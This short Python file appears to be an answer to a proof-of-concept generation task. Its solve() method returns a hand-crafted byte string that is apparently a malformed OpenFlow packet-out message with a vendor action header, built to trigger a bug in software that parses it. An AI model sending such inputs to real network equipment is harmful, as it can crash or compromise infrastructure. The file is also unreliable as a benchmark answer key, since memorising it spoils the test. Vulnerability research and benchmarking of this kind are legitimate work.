class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x01\x0d\x00\x48\x00\x00\x00\x00'
        body = b'\x00\x00\x00\x00\x00\x00\x00\x38'
        action_header = b'\xff\xff\x00\x38\x00\x00\x23\x20\x00\x1a\x00\x28\x00\x00\x00\x00'
        raw_data = b'\x00\x01\x00\x28' + b'\x00' * 36
        poc = header + body + action_header + raw_data
        return poc